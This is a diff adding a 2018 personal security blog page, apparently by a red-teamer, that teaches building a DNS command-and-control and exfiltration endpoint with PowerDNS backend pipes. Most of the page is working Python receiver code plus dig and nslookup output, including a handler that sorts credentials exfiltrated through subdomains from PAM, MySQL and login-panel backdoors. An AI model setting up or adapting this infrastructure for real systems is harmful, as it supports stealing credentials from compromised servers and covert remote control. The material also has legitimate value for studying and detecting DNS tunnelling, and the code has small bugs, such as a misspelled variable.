@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Building simple DNS endpoints for exfiltration or C&amp;C | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Building simple DNS endpoints for exfiltration or C&amp;C" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Brief tutorial of how to use backend pipes in PowerDNS for exfiltration" />
+<meta property="og:description" content="Brief tutorial of how to use backend pipes in PowerDNS for exfiltration" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/11/09/DNS-endpoint-exfiltration.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/11/09/DNS-endpoint-exfiltration.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-11-09T16:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Building simple DNS endpoints for exfiltration or C&amp;C" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-11-09T16:00:00+01:00","datePublished":"2018-11-09T16:00:00+01:00","description":"Brief tutorial of how to use backend pipes in PowerDNS for exfiltration","headline":"Building simple DNS endpoints for exfiltration or C&amp;C","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/11/09/DNS-endpoint-exfiltration.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/11/09/DNS-endpoint-exfiltration.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>9 November 2018</small>
+<h1>Building simple DNS endpoints for exfiltration or C&C</h1>
+
+
+<p>        
+DNS as a cover-channel is a well-known technique used widely in pentests and Red Team operations to bypass network restrictions. For example, in my post <a href="https://x-c3ll.github.io/posts/PAM-backdoor-DNS/">Exfiltrating credentials via PAM backdoors &amp; DNS requests</a> an authoritative DNS server owned by us is used as endpoint to catch and store stolen credentials via a PAM backdoor, but… How can we deploy a simple endpoint to handle the incoming DNS requests?</p>
+
+<p>        
+When I had to develop malware for some operation of the Red Team, I relied on DNSlib to manage the DNS component of C&amp;C. But it can be tedious to program everything from scratch, so I found another way to implement these functions in a pain-less way. Indeed an endpoint for exfiltration like <a href="https://github.com/TarlogicSecurity/Arecibo">Arecibo</a> can be developed in 10 minutes or less. Lets enjoy the magic of PowerDNS and its backend pipes!</p>
+
+<h2 id="0x01-introduction">0x01 Introduction</h2>
+<p>        
+<a href="https://www.powerdns.com/">PowerDNS</a> is an open source DNS software with a cool functinality called “backend pipe” that allows us to work with DNS requests from an external program. Our program (in our example is going to be a python script) communicates with PowerDNS via STDIN/STDOUT: PowerDNS send to us the key information from a DNS request (STDIN), we process it and answer it via STDOUT. Simple as hell, you do not need to worry about parse nothing: everything is made automagically in background.</p>
+
+<p>        
+Install powerdns and its backend support (in your distro it must be something similar to pdns &amp; pdns-backend-pipe), create a .py file and give to it execution perms. Edit pdns.conf:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>launch=pipe
+pipe-command=/your/path/backend-dns.py
+</code></pre></div></div>
+
+<h2 id="0x02-handling-the-basic">0x02 Handling the basic</h2>
+<p>        
+As we said before the communication between our script and PowerDNS is made via STDIN/STDOUT via tokenized messages. Every portion of the message is tokenized using ‘\t’ as separator. To see it better:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span>
+
+
+ <span class="c1"># Alive check
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span> <span class="p">)</span> <span class="c1"># Use STDERR to print debug info
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Alive!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+ <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+     <span class="n">request</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+     <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">request</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+     <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>        
+Now run a nslookup:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mothra@arcadia:/tmp|⇒  nslookup
+&gt; server 127.0.0.1
+Default server: 127.0.0.1
+Address: 127.0.0.1#53
+&gt; gamusinos.net
+Server:         127.0.0.1
+Address:        127.0.0.1#53
+
+** server can't find gamusinos.net: SERVFAIL
+&gt;
+
+</code></pre></div></div>
+
+<p>        
+In our pdns_server instance we can see now the tokenized message (<code class="language-plaintext highlighter-rouge">Q       gamusinos.net   IN      SOA     -1      127.0.0.1</code>). PowerDNS did all the magic, we only need to check the kind of request (SOA in the example) and answer accordingly (just put DATA as your message type and finish it with “END”):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">#!/usr/bin/python
+</span>
+ <span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span>
+
+
+
+ <span class="c1"># Basic configuration
+</span> <span class="n">domain</span> <span class="o">=</span> <span class="s">"gamusinos.net"</span>
+ <span class="n">ttl</span> <span class="o">=</span> <span class="s">"432000"</span>
+ <span class="n">ipaddress</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+ <span class="n">ids</span> <span class="o">=</span> <span class="s">"1"</span>
+ <span class="n">hostmaster</span><span class="o">=</span><span class="s">"crazy-gamusino@narnia.net"</span>
+ <span class="n">soa</span> <span class="o">=</span> <span class="s">'%s %s %s'</span> <span class="o">%</span> <span class="p">(</span><span class="s">"ns1."</span> <span class="o">+</span> <span class="n">domain</span><span class="p">,</span> <span class="n">hostmaster</span><span class="p">,</span> <span class="n">ids</span><span class="p">)</span>
+
+ <span class="c1"># Read STDIN and split tokens
+</span> <span class="k">def</span> <span class="nf">readLine</span><span class="p">():</span>
+         <span class="n">data</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+         <span class="n">tokens</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span>
+         <span class="k">return</span> <span class="n">tokens</span>
+
+ <span class="c1"># Handle SOA request
+</span> <span class="k">def</span> <span class="nf">handleSoa</span><span class="p">(</span><span class="n">qname</span><span class="p">):</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">SOA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">soa</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"END</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="c1"># Alive check
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span> <span class="p">)</span> <span class="c1"># Use STDERR to print debug info
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Alive!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="c1"># Read incoming requests
+</span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+         <span class="n">indata</span> <span class="o">=</span> <span class="n">readLine</span><span class="p">()</span> <span class="c1"># Extract info from request
+</span>         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">indata</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span> <span class="c1"># Weird thing, not the kind of message we want
+</span>                 <span class="k">continue</span>
+         <span class="n">qname</span> <span class="o">=</span> <span class="n">indata</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span> <span class="c1"># Name queried (QNAME)
+</span>         <span class="n">qtype</span> <span class="o">=</span> <span class="n">indata</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Resource being requested (QTYPE)
+</span>         <span class="c1"># Check if the request is for us
+</span>         <span class="k">if</span> <span class="n">qname</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+                 <span class="c1"># If this is ok, then we can answer the request based on the QTYPE
+</span>                 <span class="k">if</span> <span class="n">qtype</span> <span class="o">==</span> <span class="s">"SOA"</span><span class="p">:</span>
+                         <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"[+] SOA request</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># Just to debug :)
+</span>                         <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+                         <span class="n">handleSoa</span><span class="p">(</span><span class="n">qname</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>        
+Now your backend can answer SOA requests:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mothra@arcadia:/tmp|⇒  dig SOA @127.0.0.1 gamusinos.net
+
+; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; SOA @127.0.0.1 gamusinos.net
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 64957
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1680
+;; QUESTION SECTION:
+;gamusinos.net.                 IN      SOA
+
+;; ANSWER SECTION:
+gamusinos.net.          432000  IN      SOA     ns1.gamusinos.net. crazy-gamusino.narnia.net. 1 10800 3600 604800 3600
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sat Nov 10 22:53:10 CET 2018
+;; MSG SIZE  rcvd: 104
+</code></pre></div></div>
+<p>        
+Amazing how easy and simple is to handle DNS requests! <strong>:)</strong></p>
+
+<h2 id="0x03-newtons-third-law">0x03 Newton’s Third Law</h2>
+<p>        
+We need to code simple rules in our shiny DNS backend to trigger arbitrary actions. The imagination is the only barrier to perfom it: you can use subdomains to indicate a “command” (store a credential, run a program, whatever…), or maybe just encode the action in the few first bytes of a subdomain, etc. We are going (just as an example) use the first two bytes from a subdomain resolution to determine the actions. So, imagine that during a Red Team operation few backdoors are deployed in different servers and services (a PAM module to extract SSH credentials, an UDF + trigger in MySQL to retrieve credentials used in a login panel, etc.) and they exfiltrate the credentials to us via DNS resolutions. Something like this can do the job:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+ <span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span>
+
+ <span class="c1"># Basic configuration
+</span> <span class="n">domain</span> <span class="o">=</span> <span class="s">"gamusinos.net"</span>
+ <span class="n">ttl</span> <span class="o">=</span> <span class="s">"432000"</span>
+ <span class="n">ipaddress</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+ <span class="n">ids</span> <span class="o">=</span> <span class="s">"1"</span>
+ <span class="n">hostmaster</span><span class="o">=</span><span class="s">"crazy-gamusino@narnia.net"</span>
+ <span class="n">soa</span> <span class="o">=</span> <span class="s">'%s %s %s'</span> <span class="o">%</span> <span class="p">(</span><span class="s">"ns1."</span> <span class="o">+</span> <span class="n">domain</span><span class="p">,</span> <span class="n">hostmaster</span><span class="p">,</span> <span class="n">ids</span><span class="p">)</span>
+
+ <span class="c1"># Read STDIN and split tokens
+</span> <span class="k">def</span> <span class="nf">readLine</span><span class="p">():</span>
+         <span class="n">data</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+         <span class="n">tokens</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span>
+         <span class="k">return</span> <span class="n">tokens</span>
+
+ <span class="c1"># Handle basic requests
+</span> <span class="k">def</span> <span class="nf">handleSoa</span><span class="p">(</span><span class="n">qname</span><span class="p">):</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">SOA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">soa</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"END</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="k">def</span> <span class="nf">handleNS</span><span class="p">(</span><span class="n">qname</span><span class="p">):</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">A</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"END</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="k">def</span> <span class="nf">handleA</span><span class="p">(</span><span class="n">qname</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">A</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span>  <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">NS</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="s">"ns1."</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"DATA</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">qname</span> <span class="o">+</span>  <span class="s">"</span><span class="se">\t</span><span class="s">IN</span><span class="se">\t</span><span class="s">NS</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ttl</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">ids</span> <span class="o">+</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="s">"ns2."</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"END</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="k">def</span> <span class="nf">saveCredential</span><span class="p">(</span><span class="n">qname</span><span class="p">):</span>
+         <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"  [+] Storing new credential!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+         <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+         <span class="k">if</span> <span class="n">qname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"a"</span><span class="p">:</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"  - Credential from PAM backdoor</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+                 <span class="c1"># Do things to decrypt and save to a database
+</span>         <span class="k">elif</span> <span class="n">qname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"b"</span><span class="p">:</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"  - Credential from MySQL backdoor</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+         <span class="k">elif</span> <span class="n">qname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"c"</span><span class="p">:</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"  - Credential from Login backdoor</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+         <span class="k">else</span><span class="p">:</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"  - ERROR</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                 <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+         <span class="c1"># Answer the request
+</span>         <span class="n">handleA</span><span class="p">(</span><span class="n">qname</span><span class="p">,</span> <span class="n">ipaddress</span><span class="p">)</span>
+
+<span class="c1"># Alive check
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span> <span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span> <span class="p">)</span> <span class="c1"># Use STDERR to print debug info
+</span> <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Alive!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+ <span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+
+ <span class="c1"># Read incoming requests
+</span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+         <span class="n">indata</span> <span class="o">=</span> <span class="n">readLine</span><span class="p">()</span> <span class="c1"># Extract info from request
+</span>         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">indata</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span> <span class="c1"># Weird thing, not the kind of message we want
+</span>                 <span class="k">continue</span>
+         <span class="n">qname</span> <span class="o">=</span> <span class="n">indata</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span> <span class="c1"># Name queried (QNAME)
+</span>         <span class="n">qtype</span> <span class="o">=</span> <span class="n">indata</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Resource being requested (QTYPE)
+</span>         <span class="c1"># Check if the request is for us
+</span>         <span class="k">if</span> <span class="n">qname</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+                 <span class="c1"># If this is ok, then we can answer the request based on the QTYPE
+</span>                 <span class="k">if</span> <span class="n">qtype</span> <span class="o">==</span> <span class="s">"SOA"</span><span class="p">:</span>
+                         <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"[+] SOA request</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># Just to debug :)
+</span>                         <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+                         <span class="n">handleSoa</span><span class="p">(</span><span class="n">qname</span><span class="p">)</span>
+                 <span class="k">if</span> <span class="p">(</span><span class="n">qtype</span> <span class="o">==</span> <span class="s">"A"</span> <span class="ow">or</span> <span class="n">qtype</span> <span class="o">==</span> <span class="s">"ANY"</span><span class="p">):</span>
+                         <span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"[+] A or ANY request</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># Just do debug :)
+</span>                         <span class="n">stderr</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+                         <span class="k">if</span> <span class="n">qname</span> <span class="o">==</span> <span class="n">domain</span><span class="p">:</span> <span class="c1"># No subdomains
+</span>                                 <span class="n">handleA</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="n">ipadress</span><span class="p">)</span>
+                         <span class="k">elif</span> <span class="p">(</span><span class="n">qname</span> <span class="o">==</span> <span class="s">"ns1."</span> <span class="o">+</span> <span class="n">domain</span> <span class="ow">or</span> <span class="n">qname</span> <span class="o">==</span> <span class="s">"ns2."</span> <span class="o">+</span> <span class="n">qname</span><span class="p">):</span> <span class="c1"># Asking for NS servers
+</span>                                 <span class="n">handleNS</span><span class="p">(</span><span class="n">qname</span><span class="p">)</span>
+                         <span class="k">elif</span> <span class="p">(</span><span class="n">qname</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"cdn."</span> <span class="o">+</span> <span class="n">domain</span><span class="p">)):</span> <span class="c1"># xxxx.cdn.gamusino.net
+</span>                                 <span class="n">saveCredential</span><span class="p">(</span><span class="n">qname</span><span class="p">)</span>
+</code></pre></div></div>
+<p>        
+Now emulate a request from a MySQL backdoor (<code class="language-plaintext highlighter-rouge">dig A bmandanga.cdn.gamusinos.net</code>) and enjoy:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] SOA request
+[+] A or ANY request
+        [+] Storing new credential!
+        - Credential from MySQL backdoor
+</code></pre></div></div>
+
+<h2 id="0x04-final-words">0x04 Final Words</h2>
+<p>        
+Discovering PowerDNS and backend pipes made my life a lot more easy. Just in few minutes you have a powerfull endpoint ready to work. If you find this article interesting, or spot any error or typo, feel free to contact me at twitter <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>.</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
